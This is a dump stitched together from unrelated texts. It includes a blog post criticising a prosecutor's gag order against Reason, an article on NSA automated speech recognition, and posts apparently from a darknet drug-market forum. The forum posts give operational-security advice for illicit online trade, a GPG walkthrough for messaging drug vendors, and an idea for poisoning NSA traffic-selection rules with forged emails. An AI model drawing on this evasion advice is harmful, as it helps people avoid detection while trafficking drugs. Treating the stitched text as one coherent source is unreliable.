therefore, give us a gag order.""  Reason also published AUSA Velamoor's letter asking that the gag order be lifted, and the order lifting it. Velamoor correctly noted that the order should be lifted because the subpoena was released to the public on June 8, when I published my initial post, and was widely known to the public. But Velamoor waited 11 days after that post to ask that the order be lifted, and Reason informs me that he only did so when its lawyer was on the brink of filing a motion to lift it. What was the possible justification for keeping Reason gagged for those 11 days?  Judge Frank Maas, by the way, is a colleague of Judge Forrest, the target of the questioned language and the subject of the subpoena. They work in the same courthouse.   Law Enforcement Is Better Than You: The Same Rules Don't Apply To Cops And Their Lawyers â Thug Life!  Gillespie and Welch also describe how AUSA Velamoor conveyed the gag order. Reason's attorney, Gayle Sproul, called Velamoor, told him that she represented Reason, and tried fruitlessly to reason with him. Velamoor blustered, then sought and obtained a gag order. But he didn't send it to Reason's attorney, with whom he had spoken only hours before. Instead, he sent it directly to Alissi, Reason's publisher:  Mr. Alissi,  Regarding this subpoena, I spoke to someone who said she was an attorney representing Reason in connection with this subpoena. The attorney indicated that Reason intended to notify the individuals referenced therein about the subpoena. The attorney further refused to provide me any time to take steps to protect the confidentiality of the investigation.  I have obtained the attached Court Order prohibiting Reason from notifying any third party about the subpoena.  Please forward the Order to the attorney and any other individuals who should be aware of it.  Niketh Velamoor had three purposes in sending that message directly to Alissi: to vent the petulance of momentarily thwarted power, to intimidate Reason by threatening it directly, and to undermine the relationship between Reason and its attorney.  Niketh Velamoor is a goon hiding behind a badge. That he went to Harvard simply makes him an unusually snobby goon hiding behind a badge.  If I did that, I'd be disciplined. If Gayle Sproul did it, she'd be disciplined. That's because nearly every jurisdiction prohibits, and recognizes as unethical, directly contacting a client who is represented by counsel on the subject of your communication. That prevents lawyers from tricking the clients of other lawyers into ignoring their counsel to their detriment. New York's Rule 4.2 of the Rules of Professional Conduct governing lawyers is standard:   In representing a client, a lawyer shall not communicate or cause another to communicate about the subject of the representation with a party the lawyer knows to be represented by another lawyer in the matter, unless the lawyer has the prior consent of the other lawyer or is authorized to do so by law.  So will Niketh Velamoor be disciplined for breaking this rule?  Don't be ridiculous.  Even if state bars reliably disciplined prosecutors for misconduct â and this never happens  â prosecutors are protected by a special rule. Judges â judges just like Judge Frank Maas, who issued the gag order â have decided that prosecutors need the power to make end-runs around lawyers during the investigation phase of cases, and that this conduct is therefore ""authorized by law."" Courts have decided that it would be too burdensome to require federal prosecutors to abide by local ethical rules,  rules that apply to literally every other lawyer in the United States, and too restrictive of law enforcement to prevent them from making such pre-indictment contacts as they see fit.  But consider this incident. What legitimate, ethical need did AUSA Velamoor have to contact Alissi directly instead of responding to Reason's lawyer? How was it necessary for effective law enforcement? How would restricting his communications to Reason's lawyer be burdensome? It wouldn't. But the courts reflect America, and America has embarked upon a course of almost canine deference to police and prosecutors.  It is, too often, enough for police and prosecutors to say they want to do something. Who are judges to say otherwise?  There is an image here of a cowboy shaking hands with an Indian. The caption reads:   The Indian smiles, he thinks the cowboy is his friend.   The cowboy smiles, he is glad the Indian is fooled.   Now he can exploit him.   Replace ""Indian"" with ""ordinary American."" Replace ""Cowboy"" with ""cop."" This is the state of modern law in America. Our apologies to the Indians.  Threats, Deliberate and Indifferent  It's tempting to believe AUSA Niketh Velamoor has some specific hostility towards Reason, or libertarians, or people who comment on the internet. But that's not the truth. His conduct is more consistent with the great tradition of entitlement and arrogance that comes from giving a little man power.  No offense, Mr. Velamoor: I was an entitled, arrogant little douchesquirt when I was a federal prosecutor, too. You can hardly fail to be when you're handed such power over people's lives at twenty-six. ""Power doesn't always understand that it is power,"" Gillespie says aptly. A fish doesn't know it's in water; a prosecutor doesn't necessarily perceive that he or she is swimming in the power to terrify, the power to chill speech, the power to destroy lives with no more reflection than you or I might use to phone in the least demanding task of our day.  The prosecutor is just watching the clock. The job is doing him.  Velamoor's conduct was threatening throughout â not threatening like a stalker or a foe, but threatening like a tired parent who wants obedience and gets angry with anything but quick compliance. The initial form letter accompanying the subpoena noted that while disclosing it was not forbidden, ""disclosure of the existence of this investigation might nterfere with and impede the investigation."" What does it imply when a federal prosecutor tells you that?   Most people interpret it to mean that, if the prosecutor decides you've disclosed it in some undefined way that thwarts his or her investigation, you may be the prosecutor's next target. That's certainly what Velamoor implied when he told me on the phone that he was going to ""look into"" how I got the subpoena, and what he strongly suggested to Reason's lawyer when he told her that Reason was ""coming close"" to interfering with a grand jury investigation by doing exactly what they were entitled to do and exactly what the letter said they could do. Later he told Reason that he had ""preliminary information"" that they had violated the order and that he was ""looking into it,"" yet another threat. It was a threat premised on a lie, since Reason only sent the subpoena to the targeted commenters before the gag order was issued, and because Reason didn't send it to me.  It's easy to dismiss this kind of government intimidation when you're not its target. It's quite another thing to live it.  Reason's staff was concerned from the start. Velamoor delivered the subpoena by calling the Washington D.C. office of Reason, barking at a God-damned intern (bless the poor intern's heart), and demanding know where he could send a federal grand jury subpoena. Once the subpoena arrived, and then quickly after the gag order, the team experienced what both Alissi and Gillespie described to me as alienation and loneliness. They were concerned about discussing the matter even in-house, they knew that they couldn't contact friends and colleagues outside Reason for guidance and support, so they stewed in it on their own. They couldn't find out if other people had experienced the same thing and how they had dealt with it.  As Velamoor repeated his allegations of a violation of the gag order, the impact was more and more chilling. They knew they hadn't done anything wrong, but also knew that didn't matter. ""Being innocent doesn't mean you're safe,"" point out Alissi. Alissi and Gillespie both viewed the subpoena, and the gag order, and the purported investigation of a leak as ridiculous and bizarre â a preposterous waste of resources. Gillespie called the accusations ""comical"" and admitted his first response was incredulity, building to rage. But what was both deeply concerning and infuriating was that it really didn't matter whether Velamoor was proceeding from malice, from bias, from indifference, from kissing up to a judge, or from sheer incompetence. He had the power to destroy lives no matter how or why he exercised it. The notion that he might launch investigations and prosecutions out of stupidity was, Gillespie said, more frightening than the prospect that he was some sort of Machiavellian genius.   (Which he isn't.)  And so, for the fifteen days from the subpoena to lifting the gag order, Reason's staff fought anger and anxiety, and was held hostage from reporting on an important First Amendment story at the core of their mission. They didn't, and couldn't, know how it would come out, nor how Velamoor would exercise his power over them. Would they have to change what they wrote about? Would they be forced to restrict the free-wheeling nature of their comment section?1 They knew they could fight for their principles â but knew just as well that fight could be financially and personally ruinous, if Velamoor decided to make it so.  Had he chosen to push his power play, Velamoor could have bankrupted Reason.   The Bright Side  This episode invites pessimism. But Nick Gillespie suggests that it should encourage us, because it showed how difficult it has become for the government to get away with silencing us. ""We're in a better place in terms of free speech than we've ever been as a country,"" he says, citing both culture and technology. ""It's harder and harder for the government to shut down the conversation."" Certainly things didn't go the way the government hoped here.  The challenge is to use Reason's fifteen days of enforced silence as a catalyst, not a deterrent. Technology is only as effective as the people who wield it. We need to be committed to watch for, examine, and report on abuses of power like these. More people need to tell their stories of encounters with it. ""No one knows how often this happens, or who is the target,"" said Gillespie, who emphasized that we ought to be worried about anyone getting a gag order, not just a professional journalist.  ""Unless people speak up, and unless people repeat the story, we won't have a good sense of how this power is abused."" We also need to resist the temptation to filter our vigilance through partisanship. Many people have responded to this story with comments about the Obama Administration, a purely fatuous reaction, as though Obama has time between his golf outings and Steve Wonder concerts to censor a small magazine â but the danger will remain no matter what flavor of politician is in charge. ""Power is nonpartisan,"" says Gillespie.   In Closing, An Offer  The commenters targeted in the subpoena are probably worried about a knock on the door. That knock may come. I don't think it will be accompanied by an arrest warrant, but it will be accompanied by petty thuggery and the threat of power, banal or not. Commenters: shut up. Ask to talk to a lawyer.  And drop me a line: there are many defense attorneys outraged by this, and we'll find you counsel, pro bono if needed.

I used to run a personal XMPP chat server on a virtual private machine in the cloud for me and my college friends to use. I told all my friends that I gave access to that they can use my service for anything they want, but you MUST use OTR to encrypt your communications. No unencrypted communications were allowed, otherwise I'd delete their account if I found out. I configured the server to not keep logs, but I was scared to death of getting a national security letter over something that was just supposed to be a fun project. Especially considering how politically active me and my friends all were."

My suggestion was to buy a domain name, and set up email hosting at that domain in some European country, Canada, etc. Since it would be his own personal website, its unlikely it would be blocked. Or maybe he could set up an OpenVPN server at his own house?  Of course, for work, he has access to the corporate VPN (which is intermittently blocked by the Chinese) from his company laptop , and all the software he needs to do his job, but they don't want him using the company network for personal business.

But even as they increasingly use apps that understand what they say, most people donât realize that the words they speak are not so private anymore, either.  Top-secret documents from the archive of former NSA contractor Edward Snowden show the National Security Agency can now automatically recognize the content within phone calls by creating rough transcripts and phonetic representations that can be easily searched and stored.  The documents show NSA analysts celebrating the development of what they called âGoogle for Voiceâ nearly a decade ago.  Though perfect transcription of natural conversation apparently remains the Intelligence Communityâs âholy grail,â the Snowden documents describe extensive use of keyword searching as well as computer programs designed to analyze and âextractâ the content of voice conversations, and even use sophisticated algorithms to flag conversations of interest.  The documents include vivid examples of the use of speech recognition in war zones like Iraq and Afghanistan, as well as in Latin America. But they leave unclear exactly how widely the spy agency uses this ability, particularly in programs that pick up considerable amounts of conversations that include people who live in or are citizens of the United States.  Spying on international telephone calls has always been a staple of NSA surveillance, but the requirement that an actual person do the listening meant it was effectively limited to a tiny percentage of the total traffic. By leveraging advances in automated speech recognition, the NSA has entered the era of bulk listening.  And this has happened with no apparent public oversight, hearings or legislative action. Congress hasnât shown signs of even knowing that itâs going on.  The USA Freedom Act â the surveillance reform bill that Congress is currently debating â doesnât address the topic at all. The bill would end an NSA program that does not collect voice content: the governmentâs bulk collection of domestic calling data, showing who called who and for how long.  Even if becomes law, the bill would leave in place a multitude of mechanisms exposed by Snowden that scoop up vast amounts of innocent peopleâs text and voice communications in the U.S. and across the globe.  Civil liberty experts contacted by The Intercept said the NSAâs speech-to-text capabilities are a disturbing example of the privacy invasions that are becoming possible as our analog world transitions to a digital one.  âI think people donât understand that the economics of surveillance have totally changed,â Jennifer Granick, civil liberties director at the Stanford Center for Internet and Society, told The Intercept.  âOnce you have this capability, then the question is: How will it be deployed? Can you temporarily cache all American phone calls, transcribe all the phone calls, and do text searching of the content of the calls?â she said. âIt may not be what they are doing right now, but theyâll be able to do it.â  And, she asked: âHow would we ever know if they change the policy?â  Indeed, NSA officials have been secretive about their ability to convert speech to text, and how widely they use it, leaving open any number of possibilities.  That secrecy is the key, Granick said. âWe donât have any idea how many innocent people are being affected, or how many of those innocent people are also Americans.â I Can Search Against It  NSA whistleblower Thomas Drake, who was trained as a voice processing crypto-linguist and worked at the agency until 2008, told The Intercept that he saw a huge push after the September 11, 2001 terror attacks to turn the massive amounts of voice communications being collected into something more useful.  Human listening was clearly not going to be the solution. âThere werenât enough ears,â he said.  The transcripts that emerged from the new systems werenât perfect, he said. âBut even if itâs not 100 percent, I can still get a lot more information. Itâs far more accessible. I can search against it.â  Converting speech to text makes it easier for the NSA to see what it has collected and stored, according to Drake. âThe breakthrough was being able to do it on a vast scale,â he said. mia_Intercept_NSAflagXX  More Data, More Power, Better Performance  The Defense Department, through its Defense Advanced Research Projects Agency (DARPA), started funding academic and commercial research into speech recognition in the early 1970s.  What emerged were several systems to turn speech into text, all of which slowly but gradually improved as they were able to work with more data and at faster speeds.  In a brief interview, Dan Kaufman, director of DARPAâs Information Innovation Office, indicated that the governmentâs ability to automate transcription is still limited.  Kaufman says that automated transcription of phone conversation is âsuper hard,â because âthereâs a lot of noise on the signalâ and âitâs informal as hell.â  âI would tell you we are not very good at that,â he said.  In an ideal environment like a news broadcast, he said, âweâre getting pretty good at being able to do these types of translations.â  A 2008 document from the Snowden archive shows that  transcribing news broadcasts was already working well seven years ago, using a program called Enhanced Video Text and Audio Processing:      (U//FOUO) EViTAP is a fully-automated news monitoring tool. The key feature of this Intelink-SBU-hosted tool is that it analyzes news in six languages, including Arabic, Mandarin Chinese, Russian, Spanish, English, and Farsi/Persian. âHow does it work?â you may ask. It integrates Automatic Speech Recognition (ASR) which provides transcripts of the spoken audio. Next, machine translation of the ASR transcript translates the native language transcript to English. Voila! Technology is amazing.  A version of the system the NSA uses is now even available commercially.  Experts in speech recognition say that in the last decade or so, the pace of technological improvement has been explosive. As information storage became cheaper and more efficient, technology companies were able to store massive amounts of voice data on their servers, allowing them to continually update and improve the models. Enormous processors, tuned as âdeep neural networksâ that detect patterns like human brains do, produce much cleaner transcripts.  And the Snowden documents show that the same kinds of leaps forward seen in commercial speech-to-text products have also been happening in secret at the NSA, fueled by the agencyâs singular access to astronomical processing power and its own vast data archives.  In fact, the NSA has been repeatedly releasing new and improved speech recognition systems for more than a decade.  The first-generation tool, which made keyword-searching of vast amounts of voice content possible, was rolled out in 2004 and code-named RHINEHART.  âVoice word search technology allows analysts to find and prioritize intercept based on its intelligence content,â says an internal 2006 NSA memo entitled âFor Media Mining, the Future Is Now!â  The memo says that intelligence analysts involved in counterterrorism were able to identify terms related to bomb-making materials, like âdetonatorâ and âhydrogen peroxide,â as well as place names like âBaghdadâ or people like âMusharaf.â  RHINEHART was âdesigned to support both real-time searches, in which incoming data is automatically searched by a designated set of dictionaries, and retrospective searches, in which analysts can repeatedly search over months of past traffic,â the memo explains (emphasis in original).  As of 2006, RHINEHART was operating âacross a wide variety of missions and languagesâ and was âused throughout the NSA/CSS [Central Security Service] Enterprise.â  But even then, a newer, more sophisticated product was already being rolled out by the NSAâs Human Language Technology (HLT) program office. The new system, called VoiceRT, was first introduced in Baghdad, and âdesigned to index and tag 1 million cuts per day.â  The goal, according to another 2006 memo, was to use voice processing technology to be able âindex, tag and graph,â all intercepted communications. âUsing HLT services, a single analyst will be able to sort through millions of cuts per day and focus on only the small percentage that is relevant,â the memo states.  A 2009 memo from the NSAâs British partner, GCHQ, describes how âNSA have had the BBN speech-to-text system Byblos running at Fort Meade for at least 10 years. (Initially they also had Dragon.) During this period they have invested heavily in producing their own corpora of transcribed Sigint in both American English and an increasing range of other languages.â (GCHQ also noted that it had its own small corpora of transcribed voice communications, most of which happened to be âNorthern Irish accented speech.â)  VoiceRT, in turn, was surpassed a few years after its launch. According to the intelligence communityâs âBlack Budgetâ for fiscal year 2013, VoiceRT was decommissioned and replaced in 2011 and 2012, so that by 2013, NSA could operationalize a new system. This system, apparently called SPIRITFIRE, could handle more data, faster. SPIRITFIRE would be âa more robust voice processing capability based on speech-to-text keyword search and paired dialogue transcription.â Extensive Use Abroad  Voice communications can be collected by the NSA whether they are being sent by regular phone lines, over cellular networks, or through voice-over-internet services. Previously released documents from the Snowden archive describe enormous efforts by the NSA during the last decade to get access to voice-over-internet content like Skype calls, for instance. And other documents in the archive chronicle the agencyâs adjustment to the fact that an increasingly large percentage of conversations, even those that start as landline or mobile calls, end up as digitized packets flying through the same fiber-optic cables that the NSA taps so effectively for other data and voice communications.  The Snowden archive, as searched and analyzed by The Intercept, documents extensive use of speech-to-text by the NSA to search through international voice intercepts â particularly in Iraq and Afghanistan, as well as Mexico and Latin America.  For example, speech-to-text was a key but previously unheralded element of the sophisticated analytical program known as the Real Time Regional Gateway (RTRG), which started in 2005 when newly appointed NSA chief Keith B. Alexander, according to the Washington Post, âwanted everything: Every Iraqi text message, phone call and e-mail that could be vacuumed up by the agencyâs powerful computers.â  The Real Time Regional Gateway was credited with playing a role in âbreaking up Iraqi insurgent networks and significantly reducing the monthly death toll from improvised explosive devices.â The indexing and searching of âvoice cutsâ was deployed to Iraq in 2006. By 2008, RTRG was operational in Afghanistan as well.  Keyword spotting extended to Iranian intercepts as well. A 2006 memo reported that RHINEHART had been used successfully by Persian-speaking analysts who âsearched for the words ânegotiationsâ or âAmericaâ in their traffic, and RHINEHART located a very important call that was transcribed verbatim providing information on an important Iranian targetâs discussion of the formation of a the new Iraqi government.â  According to a 2011 memo, âHow is Human Language Technology (HLT) Progressing?â, NSA that year deployed âHLT Labsâ to Afghanistan, NSA facilities in Texas and Georgia, and listening posts in Latin America run by the Special Collection Service, a joint NSA/CIA unit that operates out of embassies and other locations.  âSpanish is the most mature of our speech-to-text analytics,â the memo says, noting that the NSA and its Special Collections Service sites in Latin America, have had âgreat success searching for Spanish keywords.â  The memo offers an example from NSA Texas, where an analyst newly trained on the system used a keyword search to find previously unreported information on a target involved in drug-trafficking. In another case, an official at a Special Collection Service site in Latin America âwas able to find foreign intelligence regarding a Cuban official in a fraction of the usual time.â  In a 2011 article, âFinding Nuggets â Quickly â in a Heap of Voice Collection, From Mexico to Afghanistan,â an intelligence analysis technical director from NSA Texas described the ârare life-changing instanceâ when he learned about human language technology, and its ability to âfind the exact traffic of interest within a mass of collection.â  Analysts in Texas found the new technology a boon for spying. âFrom finding tunnels in Tijuana, identifying bomb threats in the streets of Mexico City, or shedding light on the shooting of US Customs officials in Potosi, Mexico, the technology did what it advertised: It accelerated the process of finding relevant intelligence when time was of the essence,â he wrote. (Emphasis in original.)  The author of the memo was also part of a team that introduced the technology to military leaders in Afghanistan. âFrom Kandahar to Kabul, we have traveled the country explaining NSA leadersâ vision and introducing SIGINT teams to what HLT analytics can do today and to what is still needed to make this technology a game-changing success,â the memo reads. Extent of Domestic Use Remains Unknown  Whatâs less clear from the archive is how extensively this capability is used to transcribe or otherwise index and search voice conversations that primarily involve what the NSA terms âU.S. persons.â  The NSA did not answer a series of detailed questions about automated speech recognition, even though an NSA âclassification guideâ that is part of the Snowden archive explicitly states that âThe fact that NSA/CSS has created HLT modelsâ for speech-to-text processing as well as gender, language and voice recognition, is âUNCLASSIFIED.â  Also unclassified: The fact that the processing can sort and prioritize audio files for human linguists, and that the statistical models are regularly being improved and updated based on actual intercepts. By contrast, because theyâve been tuned using actual intercepts, the specific parameters of the systems are highly classified.  âThe National Security Agency employs a variety of technologies in the course of its authorized foreign-intelligence mission,â spokesperson Vaneeâ Vines wrote in an email to The Intercept. âThese capabilities, operated by NSAâs dedicated professionals and overseen by multiple internal and external authorities, help to deter threats from international terrorists, human traffickers, cyber criminals, and others who seek to harm our citizens and allies.â  Vines did not respond to the specific questions about privacy protections in place related to the processing of domestic or domestic-to-international voice communications. But she wrote that âNSA always applies rigorous protections designed to safeguard the privacy not only of U.S. persons, but also of foreigners abroad, as directed by the President in January 2014.â  The presidentially appointed but independent Privacy and Civil Liberties Oversight Board (PCLOB) didnât mention speech-to-text technology in its public reports.  âIâm not going to get into whether any program does or does not have that capability,â PCLOB chairman David Medine told The Intercept.  His boardâs reports, he said, contained only information that the intelligence community agreed could be declassified.  âWe went to the intelligence community and asked them to declassify a significant amount of material,â he said. The âvast majorityâ of that material was declassified, he said. But not all â including âfacts that we thought could be declassified without compromising national security.â  Hypothetically, Medine said, the ability to turn voice into text would raise significant privacy concerns. And it would also raise questions about how the intelligence agencies âminimizeâ the retention and dissemination of materialâ particularly involving U.S. persons â that doesnât include information theyâre explicitly allowed to keep.  âObviously it increases the ability of the government to process information from more calls,â Medine said. âIt would also allow the government to listen in on more calls, which would raise more of the kind of privacy issues that the board has raised in the past.â  âIâm not saying the government does or doesnât do it,â he said, âjust that these would be the consequences.â A New Learning Curve  Speech recognition expert Bhiksha Raj likens the current era to the early days of the Internet, when people didnât fully realize how the things they typed would last forever.  âWhen I started using the Internet in the 90s, I was just posting stuff,â said Raj, an associate professor at Carnegie Mellon Universityâs Language Technologies Institute. âIt never struck me that 20 years later I could go Google myself and pull all this up. Imagine if I posted something on alt.binaries.pictures.erotica or something like that, and now that post is going to embarrass me forever.â  The same is increasingly becoming the case with voice communication, he said. And the stakes are even higher, given that the majority of the worldâs communication has historically been conducted by voice, and it has traditionally been considered a private mode of communication.  âPeople still arenât realizing quite the magnitude that the problem could get to,â Raj said. âAnd itâs not just surveillance,â he said. âPeople are using voice services all the time. And where does the voice go? Itâs sitting somewhere. Itâs going somewhere. Youâre living on trust.â He added: âRight now I donât think you can trust anybody.â The Need for New Rules  Kim Taipale, executive director of the Stilwell Center for Advanced Studies in Science and Technology Policy, is one of several people who tried a decade ago to get policymakers to recognize that existing surveillance law doesnât adequately deal with new global communication networks and advanced technologies including  speech recognition.  âThings arenât ephemeral anymore,â Taipale told The Intercept. âWeâre living in a world where many things that were fleeting in the analog world are now on the permanent record. The question then becomes: what are the consequences of that and what are the rules going to be to deal with those consequences?â  Realistically, Taipale said, âthe ability of the government to search voice communication in bulk is one of the things we may have to live with under some circumstances going forward.â But there at least need to be âclear public rules and effective oversight to make sure that the information is only used for appropriate law-enforcement or national security purposes consistent with Constitutional principles.â  Ultimately, Taipale said, a system where computers flag suspicious voice communications could be less invasive than one where people do the listening, given the potential for human abuse and misuse to lead to privacy violations. âAutomated analysis has different privacy implications,â he said.  But to Jay Stanley, a senior policy analyst with the ACLUâs Speech, Privacy and Technology Project, the distinction between a human listening and a computer listening is irrelevant in terms of privacy, possible consequences, and a chilling effect on speech.  âWhat people care about in the end, and what creates chilling effects in the end, are consequences,â he said. âI think that over time, people would learn to fear computerized eavesdropping just as much as they fear eavesdropping by humans, because of the consequences that it could bring.â  Indeed, computer listening could raise new concerns. One of the internal NSA memos from 2006 says an âimportant enhancement under development is the ability for this HLT capability to predict what intercepted data might be of interest to analysts based on the analystsâ past behavior.â  Citing Amazonâs ability to not just track but predict buyer preferences, the memo says that an NSA system designed to flag interesting intercepts âoffers the promise of presenting analysts with highly enriched sorting of their traffic.â  To Phillip Rogaway, a professor of computer science at the University of California, Davis, keyword-search is probably the âleast of our problems.â In an email to The Intercept, Rogaway warned that âWhen the NSA identifies someone as âinterestingâ based on contemporary NLP [Natural Language Processing] methods, it might be that there is no human-understandable explanation as to why beyond: âhis corpus of discourse resembles those of others whom we thought interesting'; or the conceptual opposite: âhis discourse looks or sounds different from most peopleâs.'â  If the algorithms NSA computers use to identify threats are too complex for humans to understand, Rogaway wrote, âit will be impossible to understand the contours of the surveillance apparatus by which one is judged.  All that people will be able to do is to try your best to behave just like everyone else.â",""

"The Hub Forums","Crazy Eights","5401.0","2014-09-30T01:35:04","Another obstacle","General Discussion/Security","The Dutch Openbaar Ministerie, their Public Prosecution Service, has leaked a document to volkskrant.nl regarding plans for Project: ITOM (Illegal Trade on Online Marketplaces). The Dutch OM will be working in conjunction with government agencies from around the world, but mostly Europe, to hinder the development of the deep webâs online marketplaces, which happen to also sell drugs among other government-approved things.   As many people know, a large amount of drug trafficking flows from the Netherlands through the ânew Silk Roadâ to the rest of the world. A previous article by Volkskrant claimed that the proceeds generated by Dutch illegal traders on online marketplaces has come to rival that of legal coffee shops. The leaked document proposed a group effort to combat illegal online trade on three fronts: prosecution, shipping, and Bitcoin.  The first point elaborated by the leaked document revealed the Dutch OMâs intention to discourage and deter the use of illegal online markets through the use of the âcriminal court.â Through international cooperation, the groups hope to unmask several Deep Web dealers and prosecute them in open court in an admitted attempt to âscareâ would-be perpetrators. Though the proper use of encryption communication technology still serves to deter prying eyes, many dealers are lazy in their operational security protocols and do not take advantage of available open source technologies. Additionally, the agencies will work to crack down on shipments of drugs around and out of Europe. Most damning of all, is the stated intention to look into people that use Bitcoin for the express reason that âthe main use of the currency is buying illicit goods.â Project ITOM will result in regulations that make it easier for the government to track bitcoins and to identify their owner. This is the beginning of a European BitLicense.  Previous Coordinated Government Action Against Illegal Online Marketplaces  Last year, the United States (with the help of other countries) was able to shut down Silk Road 1.0, the first Deep Web service to truly launch âillegal trade on online marketplacesâ to the mainstream. However, just months after the takedown of the infamous Dread Pirate Roberts, allegedly unmasked as Ross Ulbricht, Silk Road 2.0 was online and running. Despite a large hack, Silk Road 2.0 is still running strong and has even outstripped its predecessor. Besides Silk Road 2.0, there are many other Deep Web marketplaces that offer the same services or cater to niche corners of the online marketplace. The worldâs appetite for free trade is understandably large. As with all good things, participants knew that coordinated government action would eventually come to pass.  Which Agencies Are Involved with ITOM?  Along with the Dutch OM, almost every other Dutch law enforcement agency is involved in this operation. They will be working with Europol and Eurojust along with the FBI and ICE from the United States. Elsewhere in Europe, the UKâs NCA will participate along with agencies representing Germany, Portugal, and Sweden. The entire operation is being funded by the European Commission, the executive body of the European Union. In combination with the border and custom inspection forces of a litany of European countries, Project ITOM is poised to make a significant impact on these online marketplaces. As revealed in a different document dated from 2013, Project ITOM has been planned for a long time. By next year, Project ITOM will have taken âinterventionâ stepsâ¦ The community anxiously waits to see what they will be.  CCN  What Kind of Impact, Though?  In the PSA about Project ITOM posted to the DarkNetMarkets subreddit, user ITOM-Warning reminded users:  clearnet   https://www.cryptocoinsnews.com/project-itom-illegal-trade-online-markets-target-europes-bitcoin-users/  I hope this serves as a warning. We should have seen this coming, and we should also see what is coming in the next few months to years. Having good OPSEC, not leaving any traces and taking this more serious should be incredibly important to all of us, especially those in Europe.  One potential impact of Project ITOM, should it be successful in taking down some Deep Web marketplaces, is the increased use of decentralized marketplaces. Decentralized marketplaces, such as OpenBazaar, live in a land of no jurisdiction so none of the trade that takes place there could be branded as illegal, though the worldsâ governments would disagree ",""

FPGAs which are present within fiber taps. Fiber taps which are present in just about every significant IX on the planet. The matching code burnt onto the FPGAs is used to match and then extract relevant traffic passing the tap which could be running at 10Gb or more. They can't capture it all.  Are there really any surprises though in the content? Tor, remailers, anonymity software. We are sure the original list is massively bigger than the excerpt published. We are also sure that rules will vary from tap to tap and location to location.  In our opinion these rules are crude (no doubt effective though) and given how easily subverted or bypassed they could be should give you a clue as to how to bypass detection in many cases. Their systems relies on selectors like fixed IP addresses, fixed strings and basic pattern matching - all of which are effective because of that static, unchanging data.  And, without other selectors coming into play, it is not hard to subvert these rules. So if we start sending emails claiming to be from 'bridges@torproject.org' containing 'https://bridges.torproject.org/' somewhere in the body of the mail we suppose we can just inject random false bridge addresses into the XKS Tor bridge list and break the system when they incorrectly match our fake emails and blindly parse out the contents. Perhaps we could try some SQL injection...?    In the simple case of Tor bridges, if confirmation e-mails were sent with variable subjects, senders etc. then the rules required would be far more complex and expensive and it would be far harder for them to enumerate bridge addresses and therefore far harder to identify clients connected to Tor bridges and so on...  Gotta keep moving, shape shifting, mighty morphin power rangin - we make their job too easy sometimes.     ",""

A few weeks ago I went to a coffee shop and tried to connect to their public wifi while using TAILS 1.0. Although I could connect to the network, TOR wouldn't connect. I tried to do the same at a public library the other day - same result.   I wasn't able to find this topic covered on The Hub but after searching around some other places found this, a guy having the same problem in a Starbucks:   You need your browser to connect to local network and Accept, before you (that is, Tor) is allowed to make any connection to Internet.Proper sequence would be:   1. Connect to cafe's network from your OS    2. Open non-Tor browser    3. Accept terms, introduce login, etc.    4. Close non-Tor browser (unless it specifically says not to close the connection window/tab)    5. Open Tor  My question is would having to connect to their network without TOR running put me at more risk of losing the security TOR provides? I have MAC-spoofing enabled in TAILS so I thought I'd be ok, but wanted to double check.   I'm thinking if this isn't the solution, or isn't a safe one, then trying to connect through a VPN then in to TOR or using bridges may help? But I'm not sure if they would realistically be censoring TOR or not.  I did take the logs from the TOR startup wizard I can post if that would be a help  Thanks very much in advance for any help or advice!",""

After you paste their public key press ""ctrl+x"", then ""y"", then ""enter"" to save the file. Then do:  amnesia@amnesia:~$ gpg --import temp.txt To encrypt a message to a specific vendor first list your keys as shown above and find their key (the line that starts with ""pub"". For example here is what my key would output to you if you had imported my public key as previously explained.   pub   4096R/F5903263 2014-09-13uid                  thehub <ac@b>sub   4096R/7D37D322 2014-09-13 So now we go back to the temp file that we created to import the keys, and we clear it.   amnesia@amnesia:~$ nano temp.txtthen hold ""ctrl+k"" to delete all line by line. next type the message that you would like to encrypt to this specific vendor, or me for this example. When message is finished and double checked press ""ctrl+x"", then ""y"", then ""enter"". Next you do:  amnesia@amnesia:~$ gpg -ae -r F5903263 (in place of this id you could also use ""thehub"" or ""ac@b"") temp.txt This will create a new file named ""temp.txt.asc"". You will now do:  amnesia@amnesia:~$ cat temp.txt.asc The output will begin and end with:  -----BEGIN PGP MESSAGE----------END PGP MESSAGE----- You will copy from the first dash to the last. To do this in the terminal just highlight normaly and then press ""shift+ctrl+c"" to copy. Then ""ctrl+v"" to paste it wherever it is that you would have placed the clear text that you typed into the ""temp.txt"" file.  To decrypt, you would copy the text completely from the first dash to the last by highlighting then ""ctrl+v"". Then go back to your terminal and do:  amnesia@amnesia:~$ nano temp.txtDelete all lines as before by holding ""ctrl+k"". Then paste the message that was encrypted to you by pressing ""shift+ctrl+v"". Then ""ctrl+x"", and ""y"", and ""enter"".  Once you do that go ahead and issue this command:  amnesia@amnesia:~$ gpg -d temp.txt Then enter your password when prompted. Your plain text message will be displayed in the terminal. Like I said before, when you shutdown the ""amnesia"" folder all the information there is sanitized.

A 40-year-old had a roaring trade with all kinds of illegal narcotics since the end of 2012 . The drugs he ordered over the Internet. In April clicked the handcuffs on the man. Acquiring more than four kilograms of amphetamine among others could the investigators of KPI WÃ¼rzburg, as well as various domestic and foreign authorities prove. The perceived anonymity of the Internet did not help the suspect in his business.  Known by the inquiry by Police WÃ¼rzburg and Waiblingen, the customs investigation Munich and the US Federal Bureau of Investigation, the today 40-year-old ordered the drug through the so-called darknet the Internet. This non-public Internet connections are established and often used for illegal activities. The seller of the drugs from whom the accused ordered his goods, used existing and uninvolved enterprises companies adresses as shipment adress for the drugs.  The intensification of the investigation of the KPI WÃ¼rzburg and the parallel process of the customs investigation and the FBI led to the arrest of drug dealer in WÃ¼rzburg.  The evaluation of the evidence from the bust of a darknet platform in the US   showed that the WÃ¼rzburg had regularly ordered larger amounts of drugs via Internet since the end of 2012.  Meanwhile, the law enforcement agencies involved believe that the man has also ordered from other illegal sources narcotics in large quantities. Since November 2014 more than one addressed to the accused packets could be intercepted with a total of one kilogram of amphetamine, as well as cocaine and ecstasy.  The accused was brought before the investigating judge during his arrest in April 2015 and since then sits in custody. He is accused of trading of more than four kilograms of amphetamine, more than 300 ecstasy tablets, a few grams of cocaine, Crystal, and cannabis, and other synthetic drugs.  Zaphod ",""

